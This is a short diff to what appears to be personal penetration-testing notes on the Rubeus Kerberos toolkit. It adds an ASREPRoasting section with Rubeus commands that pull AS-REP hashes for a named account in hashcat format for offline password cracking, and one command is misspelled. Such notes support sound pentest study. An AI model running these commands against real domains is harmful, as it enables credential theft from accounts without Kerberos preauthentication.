@@ -14,3 +14,13 @@ C# toolkit for interacting with and abusing Kerberos. You can find the repo [her
 ```
 
 ^93887f
+
+#### ASREPRoasting
+[[ASREPRoasting]]
+```powershell
+# get AS-REP in crackable format for account w/ kerberoas preauth turned off
+.\Rubeus.exe asreproas /user:<user> /nowrap /format:<passwd cracker name>
+.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat
+```
+
+^454f39
